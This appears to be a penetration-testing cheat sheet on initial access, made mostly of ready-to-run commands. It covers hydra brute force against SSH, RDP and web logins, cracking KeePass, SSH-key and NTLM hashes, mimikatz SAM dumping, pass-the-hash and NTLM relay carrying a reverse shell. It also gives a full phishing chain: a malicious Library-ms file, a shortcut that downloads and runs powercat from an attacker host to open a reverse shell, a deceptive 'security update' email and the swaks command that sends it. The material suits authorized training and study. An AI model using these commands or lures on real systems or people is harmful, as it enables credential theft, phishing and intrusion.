# Initial Access

## [Restricted shell bypass](https://exploit-notes.hdks.org/exploit/network/protocol/restricted-shell-bypass/)

## Public Exploits

user repository:
```
https://github.com/offensive-security
```

Update exploitdb:
```
sudo apt update && sudo apt install exploitdb
```

Find something offline :
```
searchsploit words about the exploit
```
## Fixing Exploits
**Read** the code first and then **modify it**!

Cross compile:
```
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
```
NOTE: There was an error with the example and then, the option `-lws2_32` was added in order to compile it.

For a 64-bit application:
```
x86_64-w64-mingw32-gcc file.c -o file.exe
```

## Antivirus Evasion

## Password Attack

Which hash it is?
```
hashid file.hash
```

Find the `-m` flag for hashcat
```
hashcat -h | grep -i "hash_name"
```

### Attacking Network Services Logins

#### SSH and RDP
Password brute force:
```
sudo hydra -l username -P /path/to/wordlist -s $rport ssh://$rhost
```

User brute force:
```
sudo hydra -L namelist -P "p@ssw0rd" -s $rport rdp://$rhost
```

HTTP POST:

Get your data via burp and use here!
```
sudo hydra -l username -P /path/to/wordlist $rhosts http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"
```
#### Wordlists

For passwords:
```
/wordlist/rockyou.txt
/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
/usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt
```

For userlist:
```
/dirb/common/names.txt
/seclists/Usernames/Names/names.txt
/seclists/Usernames/top-usernames-shortlist.txt
```

### Mutating Lists
[hashcat Rule-based Attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)

Create a file with `$1` which is append 1 to the wordlist
```
echo \$1 > demo.rule
```

The result is that the first character of each password is capitalized AND a “1” is appended to each password:
```
cat demo1.rule
$1 c
```

In this case, each rule is used separately, resulting in two mutated passwords for every password from the wordlist
```
cat demo2.rule
$1
c
```

Path for hashcat rules:
```
/usr/share/hashcat/rules/
```

### Password Manager

Find kdbx databases:
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Extract the hash from the database:
```
keepass2john Database.kdbx > keepass.hash
```
NOTE: Remember to alter the hash file and delete everything before $keepass$...

Crack it with hashcat
```
hashcat -m 13400 keepass.hash
/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

Use this password with the GUI KeePass and extract the passwords from it.

### SSH Private Key Passphrase

Change permissions for the ssh private key (400 or 600):
```
chmod 400 id_rsa
```

Extract the hash with ssh2john:
```
ssh2john id_rsa > ssh.hash
```

Crack it with hashcat:
```
hashcat -m 22921 ssh.hash /path/to/wordlist -r ssh.rule -- force
```

JtR new rule
```
cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

Add this rule to file john.conf
```
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >>
/etc/john/john.conf'
```

With john:
```
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

### Cracking NTLM
Windows stores hashed user passwords in the Security Account Manager (SAM) database file, which is used to authenticate local or remote users.

Extracting with mimikatz (needs to be local administrator)
```
privilege::debug
token::elevate
lsadump::sam
```

Cracking with hashcat:
```
hashcat -m 1000 file.hash /path/to/wordlist -r /path/to/rule --force
```

### Passing NTLM (Pass the Hash)

With smbclient so we can access some shares:
```
smbclient \\\\$rhosts\\share -U username --pw-nt-hash ntlm_hash
```

With impacket-psexec or wmiexec. At the end of the command we could specify another argument, which is used to determine which command psexec should execute on the target system. If we leave it empty, `cmd.exe` will be executed, providing us with an interactive shell:
```
impacket-psexec -hashes 00000000000000000000000000000000:ntlm_hash username@$rhosts
```

```
impacket-wmiexec -hashes 00000000000000000000000000000000:ntlm_hash username@$rhosts
```

### Cracking Net-NTLMv2
If we’ve obtained code execution on a remote system, we can easily force it to authenticate with us by commanding it to connect to our prepared SMB server.

Setting up Responder on local machine:
```
sudo responder -I tun0
```

Send a dir/ls command to your ip address so Responder can get the Net-NTLMv2 hash:
```
dir \\$lhost\something
```

Cracking it with hashcat:
```
hashcat -m 5600 file.hash /path/to/wordlist --force
```

### Relaying Net-NTLMv2

In kali machine, let's set the ntlmrelayx from impacket:
```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t server_need_access -c "powershell -enc base64(reverse_shell)"
```

From the windows machine that we have access as an unprivilege user, we send a dir/ls command to your ip:
```
dir \\$lhost\something
```

With this, impacket will try to relay our hash to other machine with ip is `server_need_access`.

## Client Side Attack

### Macro attacks:

[Libreoffice](https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html)
[Libreoffice](https://insert-script.blogspot.com/2019/02/libreoffice-cve-2018-16858-remote-code.html)

### Mail Server

Get some credentials and try to use it as phishing attack

Setting up a webdav share and put your phishing file in webdab dir (config.Library-ms and the reverse shell shortcut):
```
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /path/to/webdav/
```

Use Visual Studio to save the config.Library-ms file:
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://changeheretoyourip</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
NOTE: changeheretoyourip should be your webdav ip, which in this case is your machine tun0 interface ip.

Windows shortcut (in Desktop, select New > Shortcut) should be:
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$lhost:$webport/powercat.ps1'); powercat -c $lhost -p $lport -e powershell"
```

Copy to a another directory powercat script and set up a web server to it:
```
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
```

Remeber, this is only for the powercat.ps1
```
python3 -m http.server $webport
```

Set up your nc listener for the reverse shell:
```
nc -nlvp $lport
```

Make a body.txt to send to the users in the mail server:
```
Hey!
I checked this MACHINE and discovered that the previously used staging script still exists in the Git logs.
I'll remove it for security reasons.
On an unrelated note, please install the new security features on your workstation.
For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!
John
```

Using swaks to send the email:
```
sudo swaks -t username1@mailserver.com -t user2@mailserver.com --from john@mailserver.com --attach @config.Library-ms --server $mailserver_ip --body @body.txt --header "Subject: Git Vulnerability" --suppress-data -ap
```
You will be asked for a login. Enter the credentials founded and send the e-mail. Now just wait for your reverse shell

## Pivoting

### SSH Local Port Forwarding

### SSH Dynamic Port Forwarding

### SSH Remote Port Forwarding

### SSH Remote Dynamic Port Forwarding

### sshutle

### PLink

### netsh

### ssh.exe

### Chisel (very important!)

### dnscat
